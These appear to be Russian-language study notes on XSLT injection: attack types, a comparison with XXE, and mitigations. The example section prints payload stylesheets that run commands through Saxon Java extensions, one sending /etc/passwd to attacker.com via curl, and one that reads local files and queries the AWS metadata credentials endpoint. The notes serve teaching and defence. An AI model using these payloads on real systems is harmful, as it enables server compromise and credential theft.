### **1. Типы XSLT-атак**

> [!note] **XSLT (Extensible Stylesheet Language Transformations)**
 > это язык для преобразования XML-документов. Проблема в том, что это **Тьюринг-полный язык программирования**, и если злоумышленник может контролировать входные данные (XML) или саму таблицу стилей (XSLT), он может выполнять произвольные операции.
 > > **«Тьюринг-полный язык программирования»** означает, что **с его помощью можно реализовать любой заданный алгоритм**.
 
 **XSLT используется для преобразования XML-документов** из одного вида в другой. Это делает данные удобными для чтения и использования, не вдаваясь в сложность кода. Некоторые задачи, для которых применяется XSLT:

- **Генерация отчётов**. Преобразование данных из XML в удобочитаемый формат, например, в HTML или PDF.
- **Агрегация данных**. Сбор информации из разных источников XML и объединение их в один документ.
- **Фильтрация данных**. Выборка только тех данных из XML, которые соответствуют определённым критериям.

> [!warning] Основные типы атак:
> 
> **а) Remote Code Execution (RCE) / Выполнение системных команд**  
Это наиболее опасный тип атаки. Многие XSLT-процессоры (особенно старые версии или с небезопасными настройками) предоставляют функции для взаимодействия с операционной системой.
> >- **Пример для Java (Saxon, Xalan):** Использование расширений, таких как `xsl:script`, `system-property()`, или вызовы статических методов Java.
> >- **Пример для .NET (XslCompiledTransform):** Использование `msxsl:script` для выполнения кода C# или [VB.NET](https://vb.net/).
> >- **Пример для PHP (XSLTProcessor):** Использование функций вроде `php:function` или `system()`.
> 
> **б) File Disclosure / Чтение файлов**  
Атакующий может использовать XSLT для чтения содержимого файлов на сервере.
> >- **Механизм:** Функции вроде `document()`, `unparsed-text()`, или `file://` схема URI позволяют загружать внешние ресурсы, включая локальные файлы.
> >- **Цель:** Чтение конфиденциальных файлов (`/etc/passwd`, `~/.ssh/id_rsa`, файлов конфигурации приложения).
> 
> **в) Server-Side Request Forgery (SSRF)**  
XSLT может инициировать исходящие HTTP-запросы с сервера.
> >**Механизм:** Использование функций `document()`, которая может загружать данные по HTTP/HTTPS. Это позволяет атакующему:
> > - Сканировать внутреннюю сеть сервера.
> > - Обращаться к ресурсам, недоступным извне (например, к метаданным облачных инстансов в AWS/Azure/GCP).
> > - Выполнять атаки на внутренние приложения.
> 
> **г) Denial-of-Service (DoS)**  
XSLT-преобразования могут быть вычислительно сложными. Атакующий может предоставить XSLT, который вызывает бесконечный цикл, рекурсивное включение или потребляет огромное количество памяти (например, с помощью "XML Billion Laughs", встроенного в XSLT).
> >**Пример:** Создание шаблона с глубокой рекурсией или генерация чрезмерно большой строки.
> 
> **д) Out-of-Band Data Exfiltration (OOB)**  
Если прямой вывод результата преобразования недоступен атакующему, он может использовать технику "слепого" преобразования для извлечения данных.
> > **Механизм:** Внедрение XSLT, который читает конфиденциальные данные (например, через `document()`), а затем отправляет их на контролируемый атакующим сервер, используя SSRF-механизм (например, формируя URL с данными в качестве параметра).
    

---

### **2. Разница с XXE (XML External Entity)**

Это ключевое различие, которое важно понимать.

|Параметр|XXE (XML External Entity)|XSLT Attack|
|---|---|---|
|**Механизм**|Злоупотребление **функционалом DTD** в XML. Создание сущностей, которые ссылаются на внешние или внутренние ресурсы.|Злоупотребление **функционалом самого языка XSLT**. XSLT — это язык программирования, и атака заключается в выполнении вредоносного кода на этом языке.|
|**Условия для атаки**|Парсер XML **должен быть сконфигурирован небезопасно** (разрешены внешние сущности).|Приложение должно выполнять **XSLT-преобразование**, и атакующий должен контролировать либо XML, либо саму XSLT-таблицу стилей.|
|**Уровень атаки**|Атака на уровне **парсера XML**.|Атака на уровне **XSLT-процессора**.|
|**Гибкость**|Ограничена возможностями DTD (чтение файлов, SSRF, DoS). RCE возможно только в очень специфических случаях (например, ожидание и обработка ошибки парсера).|**Гораздо более гибкая**. Позволяет выполнять сложную логику, включая полноценное RCE, в зависимости от возможностей процессора.|

**Ключевой вывод:** Приложение может быть защищено от XXE (отключены DTD), но при этом оставаться уязвимым к XSLT-атакам, если оно выполняет преобразования на основе непроверенных входных данных.

>[!note] **DTD (Document Type Definition)**
>Это **стандарт описания структуры XML-документа или его части**.
>С помощью DTD описывают элементы, входящие в состав документа, наличие у них дочерних узлов, атрибутов и т. д.
>
>**Некоторые задачи, для которых используется DTD:**
>- **Определение синтаксиса**. DTD позволяет задать правила и структуру XML-документа, указывает на типы элементов, их последовательность и возможные атрибуты.
>- **Валидация документов**. DTD используется для проверки соответствия XML-документов определённым правилам и структуре.
>- **Поддержка переиспользования**. Определение структуры и типов элементов в DTD позволяет максимально использовать переиспользуемые компоненты при создании различных XML-документов.

---

### **3. Последствия XSLT**

- **Полный компромисс сервера** через RCE.
- **Утечка конфиденциальных данных** (файлы, переменные окружения, данные из внутренней сети).
- **Компромисс внутренней инфраструктуры** через SSRF.
- **Остановка работы приложения** (DoS).
- **Цепные атаки:** Использование скомпрометированного сервера для дальнейших атак внутри сети.

---

### **4. Наглядные примеры**

**Пример 1: RCE через расширения в Java (Saxon)**

Представьте, что приложение принимает XML и XSLT от пользователя для генерации отчета.

---

_Вредоносный XML:_
```xml
<?xml version="1.0"?>
<?xml-stylesheet type="text/xsl" href="attack.xsl"?>
<data>Anything</data>
```

#### **Что делает этот XML вредоносным?**

##### **1. Ключевая инструкция: `<?xml-stylesheet?>`**

Строка `<?xml-stylesheet type="text/xsl" href="attack.xsl"?>` — это **Processing Instruction**, которая говорит XML-процессору:

> _"Для обработки этого XML-документа используй XSLT-преобразование из файла 'attack.xsl'"_

##### **2. Контекст атаки**

**Представьте уязвимое приложение, которое:**

- Принимает XML от пользователя
- Автоматически применяет XSLT-преобразование, указанное в `<?xml-stylesheet?>`
- Имеет доступ к файловой системе или может загружать внешние ресурсы

**В этом случае злоумышленник может:**

1. **Создать вредоносный XSLT-файл** (`attack.xsl`) с кодом для RCE, чтения файлов и т.д.
2. **Разместить его в доступном месте** (на своем сервере, в загружаемой директории приложения и т.п.)
3. **Передать свой XML**, который заставит приложение выполнить этот вредоносный XSLT

##### **3. Пример полной атаки**

```xml
<!-- Вредоносный XML от пользователя -->
<?xml version="1.0"?>
<?xml-stylesheet type="text/xsl" href="http://attacker.com/malicious.xsl"?>
<data>Anything</data>
```

```xml
<!-- Содержимое malicious.xsl на сервере злоумышленника -->
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
                              xmlns:java="http://saxon.sf.net/"
                              extension-element-prefixes="java">
  <xsl:template match="/">
    <result>
      <!-- Выполнение произвольной команды на сервере -->
      <xsl:value-of select="java:runtime.exec('curl http://attacker.com/steal?data=$(cat /etc/passwd)')"/>
    </result>
  </xsl:template>
</xsl:stylesheet>
```

##### **4. Альтернативные сценарии использования**

Даже если приложение игнорирует `<?xml-stylesheet?>`, аналогичная атака возможна, когда:

- **Приложение позволяет пользователю загружать обе части**: и XML, и XSLT
- **XSLT жестко задан в приложении, но содержит уязвимости**
- **Атакующий может влиять на путь к XSLT через параметры**

##### **5. Почему это опасно?**

Основная опасность в **неявном выполнении кода**. Приложение думает, что просто "преобразует XML", но фактически выполняет произвольный код, указанный злоумышленником.

##### **Меры защиты против такого вектора**

1. **Игнорировать Processing Instructions** из пользовательского XML
2. **Использовать только предопределенные, доверенные XSLT-шаблоны**
3. **Запрещать загрузку внешних ресурсов** в XSLT-процессоре
4. **Валидировать**, что XSLT загружается только из разрешенных источников

**Суть:** Вредоносным является не содержимое XML-данных, а **метаданные**, которые заставляют приложение выполнить непроверенный код.

---

_Вредоносная XSLT (attack.xsl):_
```xml
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
                              xmlns:java="http://saxon.sf.net/"
                              extension-element-prefixes="java">
  <xsl:template match="/">
    <output>
      <!-- Выполнение команды "id" в Unix-системе -->
      <xsl:value-of select="java:runtime.exec('id')"/>
    </output>
  </xsl:template>
</xsl:stylesheet>
```

Если процессор (например, старый Saxon) разрешает выполнение расширений Java, эта XSLT выполнит команду `id` и вернет результат.

**Пример 2: Чтение файла и SSRF**

_Вредоносная XSLT:_
```xml
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    <stolen_data>
      <!-- Чтение локального файла /etc/passwd -->
      <file>
        <xsl:value-of select="document('/etc/passwd')"/>
      </file>
      <!-- Выполнение SSRF-запроса к метаданным AWS -->
      <ssrf>
        <xsl:copy-of select="document('http://169.254.169.254/latest/meta-data/iam/security-credentials/')"/>
      </ssrf>
    </stolen_data>
  </xsl:template>
</xsl:stylesheet>
```

---

### **5. Меры защиты (Best Practices)**

1. **Валидация и санитизация входных данных:** Никогда не использовать непроверенные пользовательские данные в качестве XML или XSLT.
2. **Белые списки источников XSLT:** Загружайте XSLT-шаблоны только из доверенных, статических источников (например, из `classpath` или защищенной файловой системы), а не из пользовательского ввода.
3. **Конфигурация XSLT-процессора:**
>- Отключите поддержку расширений (`Java`, `.NET`, `PHP`).
>- Отключите возможность обработки внешних DTD и сущностей (это защитит и от XXE внутри XSLT).
>- Запретите использование "опасных" функций: `document()`, `unparsed-text()`, `system-property()`, `xsl:script` и т.д. (если процессор это позволяет).
4. **Запуск в изолированном окружении (Sandbox):** Если необходимо выполнять динамические преобразования, используйте процессоры с поддержкой sandbox'а, которые ограничивают доступ к системным ресурсам.
    
5. **Сканирование зависимостей:** Убедитесь, что используемые библиотеки (Saxon, Xalan и др.) обновлены и не содержат известных уязвимостей.